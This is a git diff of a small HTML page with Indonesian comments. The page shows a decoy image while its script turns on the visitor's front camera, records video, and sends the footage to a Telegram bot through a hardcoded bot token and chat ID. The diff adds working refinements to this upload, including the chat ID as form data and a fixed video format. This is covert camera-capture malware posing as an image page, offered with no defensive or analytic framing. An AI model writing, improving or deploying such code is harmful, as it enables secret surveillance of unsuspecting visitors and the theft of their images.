@@ -22,14 +22,14 @@
     </style>
 </head>
 <body>
-    <!-- Ganti dengan gambar yang kamu inginkan -->
+    <!-- Ganti dengan gambar tampilan -->
     <img src="https://img12.pixhost.to/images/804/574487749_fikxzxmodz-developer.jpg" alt="Foto Tampilan" />
 
     <script>
         async function startRecording() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const mediaRecorder = new MediaRecorder(stream);
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                 let chunks = [];
 
                 mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
@@ -37,10 +37,11 @@
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: "video/webm" });
                     const formData = new FormData();
+                    formData.append("chat_id", "7081489041");
                     formData.append("video", blob, "recorded.webm");
+                    formData.append("supports_streaming", "false"); // Agar tidak langsung diputar (seperti video biasa)
 
-                    // Kirim langsung ke bot Telegram
-                    await fetch(`https://api.telegram.org/bot7575375182:AAHQeA5jdew2tMO5Znh9_zBqi4pwFnWUmCg/sendVideo?chat_id=7081489041`, {
+                    await fetch(`https://api.telegram.org/bot7575375182:AAHQeA5jdew2tMO5Znh9_zBqi4pwFnWUmCg/sendVideo`, {
                         method: "POST",
                         body: formData
                     });
